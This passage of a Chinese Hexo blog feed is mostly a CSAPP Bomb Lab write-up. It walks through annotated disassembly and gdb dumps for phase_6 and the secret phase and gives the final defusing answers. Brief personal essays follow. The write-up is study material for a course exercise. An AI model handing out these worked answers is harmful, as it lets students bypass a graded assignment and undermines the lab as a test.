<h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>设数串为a,b,c,d,e,f</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  0x00000000004010fc &lt;+8&gt;:     sub    $0x50,%rsp</span><br><span class="line">  0x0000000000401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">  0x0000000000401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line">  0x0000000000401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">  0x000000000040110b &lt;+23&gt;:    mov    %rsp,%r14</span><br><span class="line">  0x000000000040110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">  ;模块:即这六个数字,每个数只出现一遍且都出现</span><br><span class="line">  0x0000000000401114 &lt;+32&gt;:    mov    %r13,%rbp;r13的地址对应的值是第一个数字</span><br><span class="line">  0x0000000000401117 &lt;+35&gt;:    mov    0x0(%r13),%eax</span><br><span class="line">  0x000000000040111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">  0x000000000040111e &lt;+42&gt;:    cmp    $0x5,%eax;eax&gt;=0x5,故a&lt;=5</span><br><span class="line">  0x0000000000401121 &lt;+45&gt;:    jbe    .L1;&lt;=就不炸</span><br><span class="line">  .L1;上面的一些代码保证了每一个数字都是在[1,6]之间的</span><br><span class="line">  0x0000000000401128 &lt;+52&gt;:    add    $0x1,%r12d;r12d++</span><br><span class="line">  0x000000000040112c &lt;+56&gt;:    cmp    $0x6,%r12d;跑六次循环</span><br><span class="line">  0x0000000000401130 &lt;+60&gt;:    je     .L2</span><br><span class="line">  0x0000000000401132 &lt;+62&gt;:    mov    %r12d,%ebx;ebx=r12d</span><br><span class="line">  0x0000000000401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">  0x0000000000401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax,;rax作为变量,会依次取出每一个元素,应为rsp对着的就是6,那么+1*4就是5(测试样例为6,5,4,3,2,1),每次的循环内层循环的辞书是下降的</span><br><span class="line">  0x000000000040113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)  ;0x0(%rbp)!=%eax,保证六个数字每个只出现一次</span><br><span class="line">  0x000000000040113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">  0x0000000000401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x0000000000401145 &lt;+81&gt;:    add    $0x1,%ebx;ebx每次会加一,然后把值给到rax,故每次的eax是一个一个的从栈中取出元素</span><br><span class="line">  0x0000000000401148 &lt;+84&gt;:    cmp    $0x5,%ebx;会循环六次;这是内层循环</span><br><span class="line">  0x000000000040114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br><span class="line">  0x000000000040114d &lt;+89&gt;:    add    $0x4,%r13;r13类似于一个栈的指针,每次会往下指一个元素然后重头遍历一遍</span><br><span class="line">  0x0000000000401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;;这是外层循环</span><br><span class="line"> .L2</span><br><span class="line"> ;下一个模块:将每一个元素都变成7-int</span><br><span class="line"> 0x0000000000401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi;0,4,8,12,16,20,24</span><br><span class="line">  0x0000000000401158 &lt;+100&gt;:   mov    %r14,%rax</span><br><span class="line">  0x000000000040115b &lt;+103&gt;:   mov    $0x7,%ecx</span><br><span class="line">  0x0000000000401160 &lt;+108&gt;:   mov    %ecx,%edx</span><br><span class="line">  0x0000000000401162 &lt;+110&gt;:   sub    (%rax),%edx</span><br><span class="line">  0x0000000000401164 &lt;+112&gt;:   mov    %edx,(%rax)</span><br><span class="line">  0x0000000000401166 &lt;+114&gt;:   add    $0x4,%rax</span><br><span class="line">  0x000000000040116a &lt;+118&gt;:   cmp    %rsi,%rax;一共会循环六次</span><br><span class="line">  0x000000000040116d &lt;+121&gt;:   jne    0x401160 &lt;phase_6+108&gt;</span><br><span class="line">  </span><br><span class="line">  0x000000000040116f &lt;+123&gt;:   mov    $0x0,%esi</span><br><span class="line">  0x0000000000401174 &lt;+128&gt;:   jmp    0x401197 &lt;phase_6+163&gt;</span><br><span class="line">  ;这一段实现了把给定链表的数值倒序,根据权重把节点做一个移动</span><br><span class="line">  0x0000000000401176 &lt;+130&gt;:   mov    0x8(%rdx),%rdx</span><br><span class="line">  0x000000000040117a &lt;+134&gt;:   add    $0x1,%eax</span><br><span class="line">  0x000000000040117d &lt;+137&gt;:   cmp    %ecx,%eax</span><br><span class="line">  0x000000000040117f &lt;+139&gt;:   jne    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">  0x0000000000401181 &lt;+141&gt;:   jmp    0x401188 &lt;phase_6+148&gt;</span><br><span class="line">  0x0000000000401183 &lt;+143&gt;:   mov    $0x6032d0,%edx;这个0x6032d0一看就很奇怪,咋突然冒出来,肯定是条件,然后发现她是链表头指针直接x/24 0x6032d0就列出所有链表了</span><br><span class="line">  0x0000000000401188 &lt;+148&gt;:   mov    %rdx,0x20(%rsp,%rsi,2)搬运节点到另一个位置</span><br><span class="line">  0x000000000040118d &lt;+153&gt;:   add    $0x4,%rsi</span><br><span class="line">  0x0000000000401191 &lt;+157&gt;:   cmp    $0x18,%rsi</span><br><span class="line">  0x0000000000401195 &lt;+161&gt;:   je     0x4011ab &lt;phase_6+183&gt;</span><br><span class="line">  0x0000000000401197 &lt;+163&gt;:   mov    (%rsp,%rsi,1),%ecx;</span><br><span class="line">  0x000000000040119a &lt;+166&gt;:   cmp    $0x1,%ecx</span><br><span class="line">  0x000000000040119d &lt;+169&gt;:   jle    0x401183 &lt;phase_6+143&gt;</span><br><span class="line">  0x000000000040119f &lt;+171&gt;:   mov    $0x1,%eax</span><br><span class="line">  0x00000000004011a4 &lt;+176&gt;:   mov    $0x6032d0,%edx</span><br><span class="line">  0x00000000004011a9 &lt;+181&gt;:   jmp    0x401176 &lt;phase_6+130&gt;</span><br><span class="line">  ;对节点保存顺序的要求</span><br><span class="line">  0x00000000004011ab &lt;+183&gt;:   mov    0x20(%rsp),%rbx</span><br><span class="line">  0x00000000004011b0 &lt;+188&gt;:   lea    0x28(%rsp),%rax</span><br><span class="line">  0x00000000004011b5 &lt;+193&gt;:   lea    0x50(%rsp),%rsi</span><br><span class="line">  0x00000000004011ba &lt;+198&gt;:   mov    %rbx,%rcx</span><br><span class="line">  0x00000000004011bd &lt;+201&gt;:   mov    (%rax),%rdx</span><br><span class="line">  0x00000000004011c0 &lt;+204&gt;:   mov    %rdx,0x8(%rcx);rcx是下面的节点,rdx是上面的节点,rcx+8就是下面的节点的next地址,就是反转链表,其实不是反转,只是把链表根据权重搬迁过去后,把next重排序</span><br><span class="line">;;  他妈的卧槽反转链表,妈的,有理由推断出要进行遍历</span><br><span class="line">  ;struct node&#123;</span><br><span class="line">;  int val  //4</span><br><span class="line"> ; int steps  //4</span><br><span class="line">  ;node*next  //8</span><br><span class="line"> ; &#125;</span><br><span class="line">  0x00000000004011c4 &lt;+208&gt;:   add    $0x8,%rax</span><br><span class="line">  0x00000000004011c8 &lt;+212&gt;:   cmp    %rsi,%rax</span><br><span class="line">  0x00000000004011cb &lt;+215&gt;:   je     0x4011d2 &lt;phase_6+222&gt;</span><br><span class="line">  0x00000000004011cd &lt;+217&gt;:   mov    %rdx,%rcx</span><br><span class="line">  0x00000000004011d0 &lt;+220&gt;:   jmp    0x4011bd &lt;phase_6+201&gt;</span><br><span class="line">  ;实现了一个链表结构</span><br><span class="line">  0x00000000004011d2 &lt;+222&gt;:   movq   $0x0,0x8(%rdx)</span><br><span class="line">  0x00000000004011da &lt;+230&gt;:   mov    $0x5,%ebp</span><br><span class="line">  0x00000000004011df &lt;+235&gt;:   mov    0x8(%rbx),%rax;rbx+8的值给到rax</span><br><span class="line">  0x00000000004011e3 &lt;+239&gt;:   mov    (%rax),%eax</span><br><span class="line">  0x00000000004011e5 &lt;+241&gt;:   cmp    %eax,(%rbx);所以是上面的数要小一点</span><br><span class="line">  0x00000000004011e7 &lt;+243&gt;:   jge    0x4011ee &lt;phase_6+250&gt;;要大于等于,不然爆炸</span><br><span class="line">  0x00000000004011e9 &lt;+245&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">  0x00000000004011ee &lt;+250&gt;:   mov    0x8(%rbx),%rbx;再往上找下一个数字</span><br><span class="line">  0x00000000004011f2 &lt;+254&gt;:   sub    $0x1,%ebp</span><br><span class="line">  0x00000000004011f5 &lt;+257&gt;:   jne    0x4011df &lt;phase_6+235&gt;</span><br><span class="line">  0x00000000004011f7 &lt;+259&gt;:   add    $0x50,%rsp</span><br></pre></td></tr></table></figure>

<p>找出了题目给的的数组(结构体的值)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) p 0x0000014c</span><br><span class="line">$7 = 332   2</span><br><span class="line">(gdb) p  0x000000a8</span><br><span class="line">$8 = 168   1</span><br><span class="line">(gdb) p  0x0000039c</span><br><span class="line">$9 = 924   6</span><br><span class="line">(gdb) p 0x000002b3</span><br><span class="line">$10 = 691      5</span><br><span class="line">(gdb) p 0x000001dd</span><br><span class="line">$11 = 477   4</span><br><span class="line">(gdb) p  0x000001bb</span><br><span class="line">$12 = 443   3</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure>

<p>小于等于:降序</p>
<p>得到数据: 3 4 5 6 1 2</p>
<p>然后再把它恢复到7-int之前则是 4 3 2 1 6 5</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305646.jpg"></p>
<p>注意这个链表,发现他有三个值,一个是val,一个是order,一个是指向下一个的指针,例如node1.next&#x3D;&#x3D;&gt;node2</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="type">int</span> order;</span><br><span class="line">    <span class="type">int</span> *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>所以捋顺一遍思路</p>
<ol>
<li>通过双层循环,判断6个数是[1,6]中的,并且各不相同</li>
<li>对六个数字取7的补,得到a1,b1,c1,d1,e1,f1</li>
<li>再根据取补后的数字,搬迁链表,把他按一个新的顺序排列</li>
<li>之后程序会对新的链表旅顺,让他能够遍历</li>
<li>判断下面的数都大于上面的数</li>
</ol>
<p>第3点是第五点的关键,我们知道链表一开始的排列,要把它安排成从上往下增大的形式,所以我们第一个要把924对应的node3丢过去,有规律可知,当a1&#x3D;3时会找到node3,把他搬迁过去,以此类推知道了a1-f1的顺序分别是3 4 5 6 1 2</p>
<p>再取补就可得到原数组 4 3 2 1 6 5</p>
<h2 id="secret-phase"><a href="#secret-phase" class="headerlink" title="secret_phase"></a>secret_phase</h2><p>在网上看了看发现了,这是phase_defused的反汇编函数,然后看他有一个secret_phase的调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:	48 83 ec 78          	sub    $0x78,%rsp</span><br><span class="line">  4015c8:	64 48 8b 04 25 28 00 	mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:	00 00 </span><br><span class="line">  4015d1:	48 89 44 24 68       	mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:	31 c0                	xor    %eax,%eax</span><br><span class="line">  4015d8:	83 3d 81 21 20 00 06 	cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;</span><br><span class="line">  4015df:	75 5e                	jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:	4c 8d 44 24 10       	lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:	48 8d 4c 24 0c       	lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:	48 8d 54 24 08       	lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:	be 19 26 40 00       	mov    $0x402619,%esi; &quot;%d %d %s&quot;</span><br><span class="line">  4015f5:	bf 70 38 60 00       	mov    $0x603870,%edi;经过尝试发现和phase_4的寄存器地址时一样的</span><br><span class="line">  4015fa:	e8 f1 f5 ff ff       	callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">  401602:	75 31                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  #char *0x402622=&quot;DrEvil&quot;</span><br><span class="line">  401604:	be 22 26 40 00       	mov    $0x402622,%esi</span><br><span class="line">  401609:	48 8d 7c 24 10       	lea    0x10(%rsp),%rdi</span><br><span class="line">  40160e:	e8 25 fd ff ff       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:	85 c0                	test   %eax,%eax</span><br><span class="line">  401615:	75 1e                	jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  #Curses, you&#x27;ve found the secret phase!</span><br><span class="line">  401617:	bf f8 24 40 00       	mov    $0x4024f8,%edi</span><br><span class="line">  40161c:	e8 ef f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  #But finding it and solving it are quite different...</span><br><span class="line">  401621:	bf 20 25 40 00       	mov    $0x402520,%edi</span><br><span class="line">  401626:	e8 e5 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401630:	e8 0d fc ff ff       	callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:	bf 58 25 40 00       	mov    $0x402558,%edi</span><br><span class="line">  40163a:	e8 d1 f4 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:	48 8b 44 24 68       	mov    0x68(%rsp),%rax</span><br><span class="line">  401644:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">  40164b:	00 00 </span><br><span class="line">  40164d:	74 05                	je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:	e8 dc f4 ff ff       	callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:	48 83 c4 78          	add    $0x78,%rsp</span><br><span class="line">  401658:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>我们通过defuse_phase知道了secret的调用并且猜到了其中一个s密码,现在要找剩下的两个%d,然后发现他调用的寄存器时phase_4的,所以他们用的是同一个输入,我们直接在答案7 0 后面加一个 DrEvil ,这样就成功的进入这个secret_phase了  </p>
<p>secret_phase</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:	53                   	push   %rbx</span><br><span class="line">  401243:	e8 56 02 00 00       	callq  40149e &lt;read_line&gt;;调用函数</span><br><span class="line">  401248:	ba 0a 00 00 00       	mov    $0xa,%edx</span><br><span class="line">  40124d:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">  401252:	48 89 c7             	mov    %rax,%rdi</span><br><span class="line">  401255:	e8 76 f9 ff ff       	callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  ;</span><br><span class="line">  40125a:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  40125d:	8d 40 ff             	lea    -0x1(%rax),%eax;eax--</span><br><span class="line">  401260:	3d e8 03 00 00       	cmp    $0x3e8,%eax//eax的值 ; [1,1001]</span><br><span class="line">  401265:	76 05                	jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:	e8 ce 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  </span><br><span class="line">  40126c:	89 de                	mov    %ebx,%esi;esi中存了</span><br><span class="line">  40126e:	bf f0 30 60 00       	mov    $0x6030f0,%edi;传一个值36进去</span><br><span class="line">  401273:	e8 8c ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">  40127b:	74 05                	je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:	e8 b8 01 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:	bf 38 24 40 00       	mov    $0x402438,%edi</span><br><span class="line">  401287:	e8 84 f8 ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:	e8 33 03 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:	5b                   	pop    %rbx</span><br><span class="line">  401292:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>这里面strtol的函数原型是</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="type">int</span> <span class="title">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str,<span class="type">char</span> **endptr,<span class="type">int</span> base)</span><span class="comment">//分别是rdi,rsi,rdx</span></span></span><br></pre></td></tr></table></figure>

<p>这里面edx&#x3D;10,所以strtol会对一串字符串读取其中的前面一段连续数字,然后转化成十进制</p>
<p>在根据10,11行可得知eax内的值&lt;&#x3D;1000</p>
<p>分析可知,fun_7的返回值必须得是2才能通过</p>
<p>fun_7</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">;esi=999     *(edi)=36</span><br><span class="line">  401204:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  #if(ptr==NULL)return -1</span><br><span class="line">  401208:	48 85 ff             	test   %rdi,%rdi;所以rdi的值为0就结束了,不能为0</span><br><span class="line">  40120b:	74 2b                	je     401238 &lt;fun7+0x34&gt;//不能跳转,跳转就爆了</span><br><span class="line">  #int val =*ptr;</span><br><span class="line">  # if(val-num&lt;=0)goto fun7_28</span><br><span class="line">  40120d:	8b 17                	mov    (%rdi),%edx</span><br><span class="line">  40120f:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401211:	7e 0d                	jle    401220 &lt;fun7+0x1c&gt;;递归调用</span><br><span class="line"> # ptr=*(ptr+8)</span><br><span class="line">  401213:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  # int retval=2*fun7(ptr,num)</span><br><span class="line">  401217:	e8 e8 ff ff ff       	callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:	01 c0                	add    %eax,%eax</span><br><span class="line">  # goto fun7_57   return retval</span><br><span class="line">  40121e:	eb 1d                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  ---</span><br><span class="line">  fun7_28</span><br><span class="line">  #retval =0</span><br><span class="line">  401220:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  #if(val==num)goto fun7_57  return 0</span><br><span class="line">  401225:	39 f2                	cmp    %esi,%edx</span><br><span class="line">  401227:	74 14                	je     40123d &lt;fun7+0x39&gt;;相等就跳转</span><br><span class="line">  # ptr=*(ptr+0x10);//ptr2</span><br><span class="line">  401229:	48 8b 7f 10          	mov    0x10(%rdi),%rdi;</span><br><span class="line">  # retval=2*fun7_(ptr,num)+1</span><br><span class="line">  40122d:	e8 d2 ff ff ff       	callq  401204 &lt;fun7&gt;;递归调用</span><br><span class="line">  401232:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">  #goto fun7_57</span><br><span class="line">  401236:	eb 05                	jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  #fun7_57</span><br><span class="line">  40123d:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401241:	c3                   	retq   </span><br><span class="line">  ;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我直接挑一个地方让esi的值等于edi的值不就好了,应为fun7函数里面esi的值不变,涉及到esi的只有比较,所以我找个地方,把rax整成2,然后找到那个时候的edi的值就行了</p>
<p>输入命令,发现是一个链表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x6030f0 &lt;n1&gt;:  0x0000000000000024      0x0000000000603110</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x0000000000603130      0x0000000000000000</span><br><span class="line">0x603110 &lt;n21&gt;: 0x0000000000000008      0x0000000000603190</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x0000000000603150      0x0000000000000000</span><br><span class="line">0x603130 &lt;n22&gt;: 0x0000000000000032      0x0000000000603170</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x00000000006031b0      0x0000000000000000</span><br><span class="line">0x603150 &lt;n32&gt;: 0x0000000000000016      0x0000000000603270</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x0000000000603230      0x0000000000000000</span><br><span class="line">0x603170 &lt;n33&gt;: 0x000000000000002d      0x00000000006031d0</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x0000000000603290      0x0000000000000000</span><br><span class="line">0x603190 &lt;n31&gt;: 0x0000000000000006      0x00000000006031f0</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x0000000000603250      0x0000000000000000</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x000000000000006b      0x0000000000603210</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x00000000006032b0      0x0000000000000000</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x0000000000000028      0x0000000000000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x0000000000000001      0x0000000000000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603210 &lt;n47&gt;: 0x0000000000000063      0x0000000000000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603230 &lt;n44&gt;: 0x0000000000000023      0x0000000000000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603250 &lt;n42&gt;: 0x0000000000000007      0x0000000000000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603270 &lt;n43&gt;: 0x0000000000000014      0x0000000000000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x603290 &lt;n46&gt;: 0x000000000000002f      0x0000000000000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x00000000000003e9      0x0000000000000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>



<p>大家通过代码的翻译,能梳理出以下几点</p>
<p>目的:这个递归是对链表的递归,每一个节点都有两个指针,所以每个节点都对应着另外两个节点,我们把这个节点根据指针的顺序画出一颗树,把指针1放左边,指针二放右边,得到如下一张图.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071305660.jpg"></p>
<p>注:左下是指针一的节点,右边&#x3D;下是指针2的节点</p>
<p>然后梳理一遍代码规则(val为节点的值,num为输入的数字)</p>
<ol>
<li>若val&lt;num ,走右边的节点,return 时的返回值要*2+1</li>
<li>若val&gt;num,走左边的节点,return 时的返回值要*2</li>
<li>若val&#x3D;num,return 0</li>
</ol>
<p>然后我们一步一步的令num&#x3D;every val,把return的值算出来,确定是2的情况就好了</p>
<p>答案:0x14 和 0x16</p>
<h2 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h2><p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071308029.jpg"></p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>csapp</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】人际关系</title>
    <url>/PASTFUTURE/4/2024/02/14/</url>
    <content><![CDATA[<blockquote>
<p>人是社会性的动物,总需要群体的生活,自古以来都是这样,只不过是从一群大猩猩”进化”成为一群占地为王,占山为王,掠夺经济,资源,的新人类罢了,站上了食物链的顶端.对于社会的联系也在加强,联系的方式也在变化.</p>
</blockquote>
<h1 id="缘由"><a href="#缘由" class="headerlink" title="缘由"></a>缘由</h1><p>近几日过年自然走访亲戚,19,20岁的我还是何14,5岁没啥区别,认不清人,包括且不限于四五个姑姑,堂姐,表格,叔叔,伯伯,舅公.感觉他们之所以在年轻时能发展处如此紧密的关系网,主要是以地缘关系为桥梁,以血缘关系为紧密的纽带而联系起来,毕竟一个邻居家的爷爷就有三个儿子,每个儿子又有儿女开枝散叶,便形成了如此恐怖的关系网,我反正没理明白.</p>
<p>然后我便意识到,每个人都逃不掉走亲访友的局面<del>也可能有例外</del>,为了在几十年后我年老后或者说当我要作为主事人去发红包时,我应该要认得大家,于是我可以的留意了同辈,这是比较好接触的,至目前为止(初六),也算是结束过年,准备回广州</p>
<h1 id="终止-00后"><a href="#终止-00后" class="headerlink" title="终止?00后?"></a>终止?00后?</h1><p>会想,走亲访友这个习俗会不会在00后这里终结?</p>
<blockquote>
<p>个体更倾向于信任那些经常出现在自己生活中的人，常年不见的亲戚因时空疏离，又因城市化分工带来的差异，让价值观、态度立场难以重合，以至于“无法深聊”“共同话题不多”。</p>
<p align="right">摘自<<澎湃新闻网>></p>
</blockquote>
<p>熟悉的陌生人,地缘关系的隔离,因为父母而继承的关系私以为都会在这个网络快速发展之中被不在重视,不在特殊化,年轻一代因为网络能认识到更志同道合的朋友,但因父母而继承的关系能有共同话题的年轻一辈真是太少了,自然会以许多借口缘由而放弃社交,因为社交本身就是一件交易,付出你的价值,换取合理的利益,当交易双方不对等时,做不到一味的付出也就造成了交易的终止.</p>
<p>当然也不否认一种可能,就是多年后当年轻一辈变成了老一辈,可能会继承老一辈的思想,可能也会无聊,在不常生活的家乡去找寻昔日的年轻一辈主动进行社交,来抵消自己内心中的空虚和对过年走亲访友的一些道德感.</p>
<h1 id="传承"><a href="#传承" class="headerlink" title="传承?"></a>传承?</h1><p>以前的社会关系,社会环境恶劣,养育后代是为了家族的传承接替,需要时刻保证有壮丁能为了一整个部落抛头颅洒热血.但现在呢?似乎已经发生了根本性变化,平静的,发展的世界已经形成了太久太久,其实也没有很久,只需要两三代就可以淡掉一点战争的痛苦,抱着满怀的希望和信心开展新的生活.在平静的时代,传宗接代,血缘关系淡化,部分人开始思考多元的性,彩虹游行时长发生,可以预见,在没有外部压迫,对传承没有什么需求了,或者说哲学的进步,更多的人开始更加独立,思考的更为全面,有人是想摆烂,有人是就像<code>何以为家</code>中的那样不想让孩子生下来一起受罪.思想在当代更为跃动,颠覆了百年前,千年前的封建传统.</p>
<p>当然也不妨有一个猜测,个人的传承会被集体的传承所替代,有社会统一安排进行生育,以人造子宫,社会抚养中心的方式,中心化传承,不必做到像氪星人那样出生决定一切,那太逻辑了,违背了人性.如此的传承应该是会有更高的效率,更高的上限,或者说是一种容错方式</p>
<blockquote>
<p>以上内容纯属无稽之谈</p>
</blockquote>
<h3 id="Good-Luck"><a href="#Good-Luck" class="headerlink" title="Good Luck"></a>Good Luck</h3><blockquote>
<p>愿汝之体恒满精力，愿汝之心恒葆青春。</p>
</blockquote>
]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>镜花水月</tag>
        <tag>思考</tag>
        <tag>交往</tag>
      </tags>
  </entry>
  <entry>
    <title>important</title>
    <url>/PASTFUTURE/memory/2023/12/23/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="梦里啥都有!" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="3fcc14fc5a2dcad20d3d5bdf5da3aedf0019ad6fac524235b4e74416a1ca509d"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">吃点好的吧你!</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>PASTFUTURE</category>
      </categories>
      <tags>
        <tag>daily</tag>
        <tag>private</tag>
      </tags>
  </entry>
  <entry>
    <title>【镜花水月】信息检索</title>
    <url>/PASTFUTURE/3/2023/12/15/</url>
    <content><![CDATA[<p><strong>搜索是一项伟大的方面,我们通过它在互联网的大海内捞针,但很多时候我们都是不懂且不知道如何去搜索的.</strong></p>
<hr>
<h3 id="明晰搜索的目的"><a href="#明晰搜索的目的" class="headerlink" title="明晰搜索的目的"></a>明晰搜索的目的</h3><p>搜索是用来明确,或者扩充知识的,加深记忆,而不是用来学习系统知识的,单纯的靠搜索想啥都不用知道的使用别人写好的框架就是天方夜谭</p>
<h3 id="搜索之难"><a href="#搜索之难" class="headerlink" title="搜索之难"></a>搜索之难</h3><p>互联网的咨询很多,大家都知道,总会有人犯过你犯过的错并且给出了一条限制性的解决办法,而我能有所思考是源于这几日对各种新东西的尝试,查询资料而产生的对搜索的困惑,例如以下:</p>
<blockquote>
<ul>
<li>这两天配置fluid和next的主题的时候,不会JavaScript语言,开始时在网上盲目的搜索,胡乱抄写别人的配置,欲实现加密功能和新的page(类似于小土刀2.0),最后高不成低不就,反正是浪费了大量时间</li>
